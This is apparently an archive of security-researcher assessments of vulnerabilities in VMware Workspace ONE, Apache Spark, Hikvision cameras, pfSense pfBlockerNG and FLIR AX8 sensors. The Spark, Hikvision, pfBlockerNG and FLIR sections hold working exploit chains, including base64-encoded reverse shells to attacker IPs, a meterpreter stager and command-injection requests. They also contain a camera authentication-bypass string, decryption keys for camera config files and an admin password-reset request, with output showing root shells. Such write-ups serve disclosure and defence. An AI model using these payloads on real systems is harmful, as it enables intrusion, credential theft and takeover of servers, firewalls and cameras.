# AttackerKB assessments archive — h00die-gr3y

Archived from the AttackerKB public API before its retirement on 2026-08-18. 63 assessments.

## CVE-2022-31656
*Posted 2022-08-12 · last revised 2022-08-15*

> VMware Workspace ONE Access, Identity Manager and vRealize Automation contain an authentication bypass vulnerability affecting local domain users. A malicious actor with network access to the UI may be able to obtain administrative access without the need to authenticate.

Researcher Petrus Viet submitted his technical analysis explaining an authentication bypass vulnerability affecting local domain users. A malicious actor with network access to the UI may be able to obtain administrative access without the need to authenticate for VMware Workspace ONE Access, Identity Manager and vRealize Automation.
Please see this reference for the details:  https://petrusviet.medium.com/dancing-on-the-architecture-of-vmware-workspace-one-access-eng-ad592ae1b6dd

A quick summary of his write-up can be found here.
***
Basically this vulnerability is related to another authentication bypass (CVE-2022–22972) that was discovered in May 2022 (see reference https://blog.assetnote.io/2022/05/27/understanding-cve-2022-22972-vmware-workspace-one-access/) and was also analysed in detail by Rapid7 (see reference https://attackerkb.com/topics/Ur2L7rHv2F/cve-2022-22972). 

The java web architecture is based on a **listener->filter->servlet** construct to send web request to a java web container.
Petrus discovered that you can use the UrlRewriteFilter layer which is responsible for mapping requests to some internal servlets based on predefined rules (in the WEB-INF/urlrewrite.xml file) to read arbitrary files. 
One particular predefined rule with the regex **“^/t/([^/])(\(|/)(((?!META-INF| WEB-INF).))\)”** will filter any request which has the path math and will map it to servlet **“/$3”** allowing attackers to read arbitrary files at WEB-INF.

>Example: 
>Based on the regex, we can easily see that the request needs to start with **“/SAAS/t/_/;/”**, so for the request based on the rule with the path **“/SAAS/t/_/;/WEB-INF/web.xml”** it will be mapped to **“/WEB-INF/web.xml”**

With CVE-2022–22972 in the back of our mind, this vulnerability can be easily exploited to bypass the patch applied for CVE-2022-22972, where the developers added a HostHeaderFilter class to the filter chain to block all requests with a host header that doesn't point to the server.

By manipulating the path **“/auth/login/embeddedauthbroker/callback”** using the path **“/SAAS/t/_/;/auth/login/embeddedauthbroker/callback”** based on the predefined rule early explained, it will bypass the HostHeaderFilter class, hence you can bypass the authentication again on a patched server.

There is a POC from horizon3ai at GitHub for CVE-2022–22972 (https://github.com/horizon3ai/CVE-2022-22972) that can be reused to test this vulnerability.

Combining this vulnerability with CVE-2022-31659 that allows remote code execution once the malicious user obtains administrator privileges makes VMware Workspace ONE Access, Identity Manager and vRealize Automation targets again.

VMWare has released patches (https://www.vmware.com/security/advisories/VMSA-2022-0021.html) for both CVEs, and it is recommended that all VMWare Workspace ONE clients apply these patches immediately to mitigate potential exploitation.


---

## CVE-2022-33891
*Posted 2022-08-19 · last revised 2022-08-25*

> The Apache Spark UI offers the possibility to enable ACLs via the configuration option spark.acls.enable. With an authentication filter, this checks whether a user has access permissions to view or modify the application. If ACLs are enabled, a code path in HttpSecurityFilter can allow someone to perform impersonation by providing an arbitrary user name. A malicious user might then be able to reach a permission check function that will ultimately build a Unix shell command based on their input, and execute it. This will result in arbitrary shell command execution as the user Spark is currently running as. This affects Apache Spark versions 3.0.3 and earlier, versions 3.1.1 to 3.1.2, and versions 3.2.0 to 3.2.1.

Apache Spark released the latest security bulletin on July 18, which contains a shell command injection vulnerability (CVE-2022-33891).  The security researcher Kostya Kortchinsky (Databricks) has been credited with reporting this flaw.

**What is exactly the issue?**
In the vulnerable versions of Apache Spark, a non-default setting called `spark.acls.enable true` triggers a shell command injection code vulnerability. This piece of code is responsible to check the permission of an user using a bash command shell in combination with the unix id command. Ironically the `spark.acls.enable true` configuration setting is designed to improve the security access within the Spark application, but unfortunately this configuration setting triggers the vulnerable code below.

```
  private def getUnixGroups(username: String): Set[String] = {
    val cmdSeq = Seq("bash", "-c", "id -Gn " + username)
    // we need to get rid of the trailing "\n" from the result of command execution
    Utils.executeAndGetOutput(cmdSeq).stripLineEnd.split(" ").toSet
    Utils.executeAndGetOutput(idPath ::  "-Gn" :: username :: Nil).stripLineEnd.split(" ").toSet
  }
}
``` 
You can trigger this very easily using `?doAs` parameter passing a raw Linux command: 
```
http://<spark-ip>:8080/?doAs=`[command injection here]`
```
User commands are processed through `?doAs` parameter and nothing reflected back on the page during command execution, so this is a blind OS injection. 

To demonstrate this vulnerability, download a vulnerable Spark docker image from dockerhub (https://hub.docker.com/).
1. Startup the Docker image
2. In a new terminal, enter `sudo docker exec -it spark_spark_1 /bin/bash`
3. In the container bash session, enter: `echo "spark.acls.enable true" >> conf/spark-defaults.conf`
4. Restart docker image

Craft the command injection. 
We will use a simple reverse shell payload: `sh -i >& /dev/tcp/192.168.201.8/4444 0>&1`
```
# echo 'sh -i >& /dev/tcp/192.168.201.8/4444 0>&1' | base64
c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yMDEuOC80NDQ0IDA+JjEK
# curl -d 'doAs=`echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yMDEuOC80NDQ0IDA+JjEK | base64 -d | bash`' -X POST http://192.168.201.37:8080/data
```
Netcat listener
```
# nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.201.8] from (UNKNOWN) [192.168.201.37] 65314
$ whoami
spark
```

Other example with Metasploit using python meterpreter
Setup and start the handler…
```
msf6 exploit(multi/handler) > exploit -j -z
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 0.0.0.0:4444
msf6 exploit(multi/handler) > jobs

Jobs
====

  Id  Name                    Payload                         Payload opts
  --  ----                    -------                         ------------
  0   Exploit: multi/handler  python/meterpreter/reverse_tcp  tcp://0.0.0.0:4444
```

Craft the payload with msfvenom
```
#  msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.201.8 LPORT=4444 -f raw
[-] No platform was selected, choosing Msf::Module::Platform::Python from the payload
[-] No arch selected, selecting arch: python from the payload
No encoder specified, outputting raw payload
Payload size: 497 bytes
exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE5Mi4xNjguMjAxLjgnLDQ0NDQpKQoJCWJyZWFrCglleGNlcHQ6CgkJdGltZS5zbGVlcCg1KQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKHpsaWIuZGVjb21wcmVzcyhiYXNlNjQuYjY0ZGVjb2RlKGQpKSx7J3MnOnN9KQo=')[0]))
```

Code the payload...
```
# echo "python -c \"exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE5Mi4xNjguMjAxLjgnLDQ0NDQpKQoJCWJyZWFrCglleGNlcHQ6CgkJdGltZS5zbGVlcCg1KQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKHpsaWIuZGVjb21wcmVzcyhiYXNlNjQuYjY0ZGVjb2RlKGQpKSx7J3MnOnN9KQo=')[0]))\"" | base64
cHl0aG9uIC1jICJleGVjKF9faW1wb3J0X18oJ2Jhc2U2NCcpLmI2NGRlY29kZShfX2ltcG9ydF9f
KCdjb2RlY3MnKS5nZXRlbmNvZGVyKCd1dGYtOCcpKCdhVzF3YjNKMElITnZZMnRsZEN4NmJHbGlM
R0poYzJVMk5DeHpkSEoxWTNRc2RHbHRaUXBtYjNJZ2VDQnBiaUJ5WVc1blpTZ3hNQ2s2Q2dsMGNu
azZDZ2tKY3oxemIyTnJaWFF1YzI5amEyVjBLRElzYzI5amEyVjBMbE5QUTB0ZlUxUlNSVUZOS1Fv
SkNYTXVZMjl1Ym1WamRDZ29KekU1TWk0eE5qZ3VNakF4TGpnbkxEUTBORFFwS1FvSkNXSnlaV0Zy
Q2dsbGVHTmxjSFE2Q2drSmRHbHRaUzV6YkdWbGNDZzFLUXBzUFhOMGNuVmpkQzUxYm5CaFkyc29K
ejVKSnl4ekxuSmxZM1lvTkNrcFd6QmRDbVE5Y3k1eVpXTjJLR3dwQ25kb2FXeGxJR3hsYmloa0tU
eHNPZ29KWkNzOWN5NXlaV04yS0d3dGJHVnVLR1FwS1FwbGVHVmpLSHBzYVdJdVpHVmpiMjF3Y21W
emN5aGlZWE5sTmpRdVlqWTBaR1ZqYjJSbEtHUXBLU3g3SjNNbk9uTjlLUW89JylbMF0pKSIK
```
Execute the payload...
```
# curl -d 'doAs=`echo cHl0aG9uIC1jICJleGVjKF9faW1wb3J0X18oJ2Jhc2U2NCcpLmI2NGRlY29kZShfX2ltcG9ydF9fKCdjb2RlY3MnKS5nZXRlbmNvZGVyKCd1dGYtOCcpKCdhVzF3YjNKMElITnZZMnRsZEN4NmJHbGlMR0poYzJVMk5DeHpkSEoxWTNRc2RHbHRaUXBtYjNJZ2VDQnBiaUJ5WVc1blpTZ3hNQ2s2Q2dsMGNuazZDZ2tKY3oxemIyTnJaWFF1YzI5amEyVjBLRElzYzI5amEyVjBMbE5QUTB0ZlUxUlNSVUZOS1FvSkNYTXVZMjl1Ym1WamRDZ29KekU1TWk0eE5qZ3VNakF4TGpnbkxEUTBORFFwS1FvSkNXSnlaV0ZyQ2dsbGVHTmxjSFE2Q2drSmRHbHRaUzV6YkdWbGNDZzFLUXBzUFhOMGNuVmpkQzUxYm5CaFkyc29KejVKSnl4ekxuSmxZM1lvTkNrcFd6QmRDbVE5Y3k1eVpXTjJLR3dwQ25kb2FXeGxJR3hsYmloa0tUeHNPZ29KWkNzOWN5NXlaV04yS0d3dGJHVnVLR1FwS1FwbGVHVmpLSHBzYVdJdVpHVmpiMjF3Y21WemN5aGlZWE5sTmpRdVlqWTBaR1ZqYjJSbEtHUXBLU3g3SjNNbk9uTjlLUW89JylbMF0pKSIK | base64 -d | bash`' -X POST http://192.168.201.37:8080/data
```

Meterpreter session…
```
msf6 exploit(multi/handler) >
[*] Sending stage (40168 bytes) to 192.168.201.37
[*] Meterpreter session 4 opened (192.168.201.8:4444 -> 192.168.201.37:49487) at 2022-08-19 21:12:25 +0000

msf6 exploit(multi/handler) > sessions -i 4
[*] Starting interaction with 4...

meterpreter > shell
Process 258 created.
Channel 1 created.
uname -a
Linux 7a26a9fb7ce3 5.10.104-linuxkit #1 SMP Thu Mar 17 17:08:06 UTC 2022 x86_64 GNU/Linux
ps ax
  PID TTY      STAT   TIME COMMAND
    1 ?        Ss     0:00 bash /opt/bitnami/spark/sbin/start-master.sh
   33 ?        S      0:00 bash /opt/bitnami/spark/sbin/spark-daemon.sh start org.apache.spark.deploy.master.Master 1 --host 7a26a9fb7ce3 --port 7077 --webui-port 8080
   38 ?        Sl     6:08 /opt/bitnami/java/bin/java -cp /opt/bitnami/spark/conf/:/opt/bitnami/spark/jars/* -Xmx1g org.apache.spark.deploy.master.Master --host 7a26a9fb7ce3 --port 7077 --webui-port 8080
  216 pts/0    Ss+    0:00 /bin/sh
  245 pts/1    Ss+    0:00 /bin/sh
  254 ?        Rsl    0:04 python -c exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE5Mi4xNjguMjAxLjgnLDQ0NDQpKQoJCWJyZWFrCglleGNlcHQ6CgkJdGltZS5zbGVlcCg1KQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKHpsaWIuZGVjb21wcmVzcyhiYXNlNjQuYjY0ZGVjb2RlKGQpKSx7J3MnOnN9KQo=')[0]))
  258 ?        S      0:00 /bin/sh
  270 ?        R      0:00 ps ax
```

To fix CVE-2022-33891, we recommend that users upgrade the Apache Spark to version 3.1.3, 3.2.2, or 3.3.0 or later in time.

### References
I have added a reference to a Metasploit module that I developed and a reference to a nice POC from HuskyHacks.

Metasploit Apache Spark Module -> https://github.com/h00die-gr3y/Metasploit/
POC  cve-2022-33891 -> https://github.com/HuskyHacks/cve-2022-33891


---

## CVE-2017-7921
*Posted 2022-09-16 · last revised 2022-10-06*

> An Improper Authentication issue was discovered in Hikvision DS-2CD2xx2F-I Series V5.2.0 build 140721 to V5.4.0 build 160530, DS-2CD2xx0F-I Series V5.2.0 build 140721 to V5.4.0 Build 160401, DS-2CD2xx2FWD Series V5.3.1 build 150410 to V5.4.4 Build 161125, DS-2CD4x2xFWD Series V5.2.0 build 140721 to V5.4.0 Build 160414, DS-2CD4xx5 Series V5.2.0 build 140721 to V5.4.0 Build 160421, DS-2DFx Series V5.2.0 build 140805 to V5.4.5 Build 160928, and DS-2CD63xx Series V5.0.9 build 140305 to V5.3.5 Build 160106 devices. The improper authentication vulnerability occurs when an application does not adequately or correctly authenticate users. This may allow a malicious user to escalate his or her privileges on the system and gain access to sensitive information.

Recently, I bumped into a bunch of Hikvision camera's during a security engagement and surprise, surprise, they were all vulnerable against this old vulnerability CVE-2017-7921 discovered by Monte Crypto in September 2017.  You can find his write up here: https://packetstormsecurity.com/files/144097/Hikvision-IP-Camera-Access-Bypass.html. 

It made me curious, because we are five years further in the game and it looks that the majority of the Hikvison camera's and other white-labelled  versions are still vulnerable. 
I ran a quick scan with Shodan (search: "App-webs" "200 OK") and it returns around 160.000 potential targets where, based on my quick assessment, probably **20%** remains vulnerable !!!

This is of course bad or good news depending which side you are on ;-), but regardless if you are a good or bad actor, it does make sense to revisit this old timer once more again.

**A small deep dive into the problem**

Many Hikvision IP cameras contain a backdoor have improper authorization logic that allows unauthenticated impersonation of any configured user account.
The basics of this vulnerability is very simple. 

**Updated based on the comment of** @gwillcox-r7
~~Our dear programmers from Hikvision left a piece of a code in the vulnerable firmware that has a hard coded magic string that bypasses all security on the camera and will provide full admin access~~.  Our dear programmers from Hikvision developed proprietary HikCGI protocol, which exposes URI endpoints through the camera's web interface. The HikCGI protocol handler checks for the presence of a parameter named `auth` in the query string and if that parameter contains a base64-encoded `username:password` string, the HikCGI API call assumes the identity of the specified user and the password is ignored. 
Using user `admin` bypasses all security on the camera and allows an attacker to completely control  the camera and modify any setting or retrieve sensible information.

You use any combination of base64 encoded `admin:password` string, such as the one below.
```
# echo "admin:11" | base64
YWRtaW46MTEK
```  
All what is needed is to append this magic string `?auth=YWRtaW46MTEK` to GET and POST queries  to access the camera with administrative privileges and do whatever you want.

Examples are:
Retrieve a list of all users and their roles: `http://camera.ip/Security/users?auth=YWRtaW46MTEK`
Obtain a camera snapshot without authentication: `http://camera.ip/onvif-http/snapshot?auth=YWRtaW46MTEK`
or one can download the camera configuration: `http://camera.ip/System/configurationFile?auth=YWRtaW46MTEK`

And the use cases for exploitation are numerous, as described in the [HIKCGI Integration Guide](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwi2yuHI7Jn6AhUZ_7sIHUSaC8oQFnoECAIQAQ&url=https%3A%2F%2Fipvm-uploads.s3.amazonaws.com%2Fuploads%2F5f72%2F4020%2F324284210-HIKCGI-Integration-Guide.pdf&usg=AOvVaw1_D3T53yzttBwB0mDX9cnX) and [IP Media Device Management Protocol User Guide](https://pdfcoffee.com/hikvision-cgi-ipmd-v159-pdf-free.html) from Hikvision.

Let me take two use cases to show how easy it is to retrieve users and passwords and change them.

First of all, if you want to retrieve the users and passwords, just first pull the configuration file from the vulnerable camera using the magic string.

``` 
curl http://camera.ip/System/configurationFile?auth=YWRtaW46MTEK --output configurationFile
```
You should get a file named `configurationFile` which holds all camera information including the user and password information in plain text.
However this file is encrypted (rather weak ;-0), so we need to decrypt it first.

There is a nice tool made by [WormChickenWizard](https://github.com/WormChickenWizard/hikvision-xor-decrypter) that will the job for us.  Check it out, but for now I just apply the logic that he described in his README.md.

First decrypt the `configurationFile` with following command:
```
openssl enc -d -in configurationFile -out decryptedoutput -aes-128-ecb -K 279977f62f6cfd2d91cd75b889ce0c9a -nosalt -md md5
```
The AES encryption is now broken but the `decryptedoutput` file is still xor encoded.
Use the tool from [WormChickenWizard](https://github.com/WormChickenWizard/hikvision-xor-decrypter) to decrypt the `decrytedoutput` file to create a readable format that we can view with a hex editor to search for the users and passwords in plain text format.

```
java XORDecode
```
You should now have a file called `plaintextOutput` file that you can inspect with a hex viewer or editor.

``` 
hexedit plaintextOutput
```
You will see output like this and the first admin and password you will find is the default admin password when your perform a factory reset (I love these Hikvision developers ;-)

```
00008358   02 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ....................................
0000837C   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ....................................
000083A0   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ....................................
000083C4   00 00 00 00  61 64 6D 69  6E 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ....admin...........................
000083E8   31 32 33 34  35 00 00 00  00 00 00 00  00 00 00 00  FF FF FF FF  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  12345...............................
0000840C   00 00 00 00  00 00 00 00  00 00 00 00  00 00 02 02  00 00 00 00  FF FF FF FF  00 00 00 00  FF FF FF FF  00 00 00 00  ....................................
00008430   FF FF FF FF  00 00 00 00  FF FF FF FF  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ....................................
00008454   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ....................................
00008478   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ....................................
---  plaintextOutput       --0x801C/0xD8B30--4%---------------------------------------------------------------------------------------------------------------------
```
If you search a bit further, you will find the actual users and passwords. In this case two users (admin and admln)

```
000A7BD4   00 00 00 00  08 10 00 00  00 00 00 00  61 64 6D 69  6E 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  ............admin...................
000A7BF8   00 00 00 00  00 00 00 00  50 61 24 24  57 30 72 64  00 00 00 00  00 00 00 00  FF FF FF FF  00 00 00 00  00 00 00 00  ........Pa$$W0rd....................
000A7C1C   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 02 02  00 00 00 00  FF FF FF FF  00 00 00 00  ....................................
000A7C40   FF FF FF FF  00 00 00 00  FF FF FF FF  00 00 00 00  FF FF FF FF  00 00 00 00  61 64 6D 6C  6E 00 00 00  00 00 00 00  ........................admln.......
000A7C64   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  61 73 64 66  31 32 33 34  00 00 00 00  00 00 00 00  ....................asdf1234........
000A7C88   00 70 0D 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 02 01  .p..................................
000A7CAC   00 00 00 00  01 00 00 00  00 00 00 00  01 00 00 00  00 00 00 00  01 00 00 00  00 00 00 00  01 00 00 00  00 00 00 00  ....................................
---  plaintextOutput       --0xA7850/0xD8B30--77%-------------------------------------------------------------------------------------------------------------------
```
 
Now if this is all too much effort, you can also decide to just reset the admin password with a new password.
The HTML code for that is pretty simple and can be easily executed using `burp`

**Note:** The new password  should at least have 2 UPPERCASE, 2 lowercase and 2 special characters, otherwise it will not be accepted.

Burp request:
```
PUT /Security/users/1?auth=YWRtaW46MTEK HTTP/1.1

<?xml version="1.0" encoding="UTF-8"?>
<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">
<id>1</id>
<userName>admin</userName>
<password>Pa$$W0rd</password>
</User>
```

To fix CVE-2017-7921, we recommend that users upgrade their Hikvision firmware to the latest version, but looking at the number of vulnerable camera's out there, this will probably not help :-(.

### References
I have added a reference to a Metasploit module that I developed and checks for a vulnerable camera and does the password reset for you.
I am currently updating the functionality of this module with some more actions to retrieve the config file, make a snapshot, enumerate the users and other stuff...
This module will be submitted shortly to the mainstream of Metasploit for acceptance of the Rapid7 development team.

Metasploit Hikvision module -> https://github.com/h00die-gr3y/Metasploit/

**Update 24 September 2022:**
Metasploit Hikvision module has been released to the mainstream -> https://github.com/rapid7/metasploit-framework/pull/17033


---

## CVE-2022-31814
*Posted 2022-10-16 · last revised 2022-10-25*

> pfSense pfBlockerNG through 2.1.4_26 allows remote attackers to execute arbitrary OS commands as root via shell metacharacters in the HTTP Host header. NOTE: 3.x is unaffected.

pfSense’s pfBlockerNG plugin version 2.1.4_26  and versions below has remote command execution vulnerability that can be exploited without any authentication and will provide root access.
Credits go the IHTeam who discovered this vulnerability in September 2022. CVE-2022-31814 carries a CVSS score of 9.8 and this vulnerability is likely to be exploited in the wild.

**pfBlockerNG** (https://docs.netgate.com/pfsense/en/latest/packages/pfblocker.html) is a pfSense plugin that is NOT installed by default and it’s generally used to block inbound connections from whole countries or IP ranges.
The vulnerability was identified in the file `/usr/local/www/pfblockerng/www/index.php` which is used to record and query DNSBL data. Specifically to query, the code uses PHP function exec(), passing untrusted data into the command line code below:

```
// Query DNSBL Alias for Domain List.
$query = str_replace('.', '\.', htmlspecialchars($_SERVER['HTTP_HOST']));

exec("/usr/bin/grep -l ' \"{$query} 60 IN A' /var/db/pfblockerng/dnsblalias/*", $match);
```
The `$_SERVER[‘HTTP_HOST’]` element passed in the above code, is a user-controllable input. An attacker can tamper with the `HTTP_HOST` parameter via the `"Host:" header` of the request.

There are a few restrictions in place that you need to bypass to make this work:
- htmlspecialchars() PHP function was preventing the use of shell redirections (> and <), double quotes (“), and ampersand (&)
- nginx web server won’t accept the forward slash (/) in the Host header, returning a 400 – Bad Request

Therefore, the only available characters to build a working payload were:
 - pipe (|)
 - semicolon (;)
 - single quote (‘)
 - spaces ( )

Other limitations are:
- Python is installed on pfSense , but it does not have the symbolic links (python3,  python), so you need to specifically mention the version a.k.a. `python3.8`
- `base64` is not installed, so for base64 decoding we will use the `python3.8 -m base64 -d` option

So let's play around what we can do here...
To easily identify a valid payload, we can copy the original command in the exec() function and try to tamper with it directly in a shell:

/usr/bin/grep -l ' "`INJECTION` 60 IN A' /var/db/pfblockerng/dnsblalias/*

In order to obtain a working PoC, we need:

- Close the single quote
- Specify a directory to search on
- Break the command with a semicolon
- Comment or add an additional single quote

A simple example is the sleep command below.
```
' *; sleep 5; '
```
This can be used as a simple test to see if your remote command execution works.

For more complex payloads that requires the restricted characters like forward slashes (/), double quotes ("") and ampersand (&), we should encode our payload with `base64` and decode using `python3.8` for execution.

A simple netcat scenario is `nc 192.168.201.8 4444 -e /bin/sh` and encode it with base64, however the `-e` option is controlled by an ip_sec_policy on the pfSense firewall which restricts the usage of the `-e` option.
It is a still a firewall, right ;-)

So another alternative is to use the reverse netcat option generated with `msfvenom` that does not use the `-e` option.
```
# msfvenom -p cmd/unix/reverse_netcat LHOST=192.168.100.7 LPORT=4444 -f raw
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 95 bytes
mkfifo /tmp/klmql; nc 192.168.100.7 4444 0</tmp/klmql | /bin/sh >/tmp/klmql 2>&1; rm /tmp/klmql
# echo 'mkfifo /tmp/klmql; nc 192.168.100.7 4444 0</tmp/klmql | /bin/sh >/tmp/klmql 2>&1; rm /tmp/klmql' | base64
bWtmaWZvIC90bXAva2xtcWw7IG5jIDE5Mi4xNjguMTAwLjcgNDQ0NCAwPC90bXAva2xtcWwgfCAvYmluL3NoID4vdG1wL2tsbXFsIDI+JjE7IHJtIC90bXAva2xtcWwK
```
Let's take this encoded payload (please check for any restricted characters) and use  python to decode payload for execution -> `python3.8 -m base64 -d`

Hence, the final payload to obtain a reverse netcat shell in pfSense would be as follows:

/usr/bin/grep -l ' "`' * ; echo bWtmaWZvIC90bXAva2xtcWw7IG5jIDE5Mi4xNjguMTAwLjcgNDQ0NCAwPC90bXAva2xtcWwgfCAvYmluL3NoID4vdG1wL2tsbXFsIDI+JjE7IHJtIC90bXAva2xtcWwK | python3.8 -m base64 -d | sh ; '` 60 IN A' /var/db/pfblockerng/dnsblalias/*

Let's now use burpsuite to send our payload to the vulnerable `pfblockerng` plugin by manipulating the `"Host:" header ` parameter to launch a netcat shell
```
GET /pfblockerng/www/index.php HTTP/1.1
Host: ' * ; echo bWtmaWZvIC90bXAva2xtcWw7IG5jIDE5Mi4xNjguMTAwLjcgNDQ0NCAwPC90bXAva2xtcWwgfCAvYmluL3NoID4vdG1wL2tsbXFsIDI+JjE7IHJtIC90bXAva2xtcWwK | python3.8 -m base64 -d | sh ; '
```
Click send and voila, we have established a netcat session on the attacker machine with root privileges.
```
# nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.100.7] from (UNKNOWN) [192.168.100.47] 45051
pwd
/usr/local/www/pfblockerng/www
whoami
root
```

As stated in the beginning of this analysis, pfSense default installation does not have the `pfblockerng` plugin installed by default, but unfortunately it is a popular plugin that is used on many installations of pfSense. It therefore makes it a very attractive target for malicious actors to explore.

There is already a Metasploit module available that exploits this vulnerability using php to launch a webshell and it has the options to spawn reverse shells.

## Mitigation
Please update your `pfBlockerNG` plugin to the latest version.

## References
[IHTeam advisory] (https://www.ihteam.net/advisory/pfblockerng-unauth-rce-vulnerability/)
[Packetstorm] (https://packetstormsecurity.com/files/168484/pfBlockerNG-2.1.4_26-Shell-Upload.html)
[Metasploit Mainstream] (https://www.rapid7.com/blog/post/2022/10/14/metasploit-wrap-up-155/)


---

## CVE-2022-37061
*Posted 2022-10-20 · last revised 2022-12-11*

> All FLIR AX8 thermal sensor cameras version up to and including 1.46.16 are vulnerable to Remote Command Injection. This can be exploited to inject and execute arbitrary shell commands as the root user through the id HTTP POST parameter in the res.php endpoint. A successful exploit could allow the attacker to execute arbitrary commands on the underlying operating system with the root privileges. NOTE: The vendor has stated that with the introduction of firmware version 1.49.16 (Jan 2023) the FLIR AX8 should no longer be affected by the vulnerability reported. Latest firmware version (as of Oct 2025, was released Jun 2024) is 1.55.16.

FLIR AX8  is a thermal sensor with imaging capabilities, combining thermal and visual cameras that provides continuous temperature monitoring and alarming for critical electrical and mechanical equipment.
This device is typically used for monitoring industrial environments in a LAN based configuration.  Occasionally you can find a FLIR AX8 device where the HTTP web interface is exposed to the public internet.

FLIR AX8 is affected by an unauthenticated remote command injection vulnerability. This can be exploited to inject and execute arbitrary shell commands as the root user through the `id` HTTP POST parameter in `res.php` endpoint. A successful exploit could allow the attacker to execute arbitrary commands on the underlying operating system with the root privileges. This issue affects all FLIR AX8 thermal sensor cameras version up to and including `1.46.16`. 

The endpoint `/res.php` can be called remotely without user authentication as there is no cookie verification `Cookie: PHPSESSID=ID` to check if the request is legitimate. The second problem is that the POST parameter `id` can be injected to execute any unix command as demonstrated in the example below.

Create a netcat reverse shell payload with `msfvenom`
```
# msfvenom -p cmd/unix/reverse_netcat LHOST=192.168.100.7 LPORT=4444 -f raw
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 100 bytes
mkfifo /tmp/ibcnr; nc 192.168.100.7 4444 0</tmp/ibcnr | /bin/sh >/tmp/ibcnr 2>&1; rm /tmp/ibcnr
```
Use this payload in a burp POST request using the vulnerable `id` parameter to launch a netcat shell.
**Note:** Do not forget to apply the URL encoding.
```
POST /res.php HTTP/1.1
Host: 192.168.100.2
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 174

action=alarm&id=2;mkfifo%20%2ftmp%2fibcnr%3b%20nc%20192.168.100.7%204444%200%3c%2ftmp%2fibcnr%20%7c%20%2fbin%2fsh%20%3e%2ftmp%2fibcnr%202%3e%261%3b%20rm%20%2ftmp%2fibcnr
```
Click send and you will receive a `netcat` shell on the attacker host.
```
# nc -lnvp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 51556
whoami
root
uname -a
Linux neco 3.0.35-flir #1 PREEMPT Thu Oct 20 08:20:20 CET 2022 armv7l GNU/Linux
```
The root cause of this command injection vulnerability is the lack of sanitization checks on the variable `$_POST["id"]`, line 65 in the file `/FLIR/usr/www/res.php` and malicious actors can therefore take advantage of the `shell_exec()` function to execute unexpected arbitrary shell commands.

Besides this vulnerability, three other vulnerabilities were identified. Check the respective CVE's for more info.
* [CVE-2022-37060] - Unauthenticated Directory Traversal
* [CVE-2022-37062] - Improper Access Control
* [CVE-2022-37063] - Reflected cross-site scripting

As stated in the beginning of this analysis, it very unlikely to find this type of devices exposed to the Internet, but you will find them quite often in industrial environments deployed in a LAN based configuration.

